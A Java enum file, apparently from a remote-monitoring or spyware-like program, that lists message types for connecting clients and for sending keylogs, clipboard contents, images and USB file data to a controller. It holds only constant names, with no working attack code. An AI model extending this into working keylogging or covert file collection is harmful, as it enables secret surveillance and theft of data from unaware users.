package snake.logic.enums;

public enum Changes {
    CONNECT("CONNECT"),
    DISCONNECT("DISCONNECT"),

    UPDATE_IMAGE("UPDATE_IMAGE"),
    UPDATE_CLIPBOARD("UPDATE_CLIPBOARD"),
    UPDATE_KEYLOG("UPDATE_KEYLOG"),
    UPDATE_USB("UPDATE_USB"),

    REQUEST_USB_FILES("REQUEST_USB_FILES"),
    REQUEST_KEYLOGS("REQUEST_KEYLOGS");
    
    private final String change;

    private Changes(String change) {
        this.change = change;
    }

    public String getChange() {
        return change;
    }
}
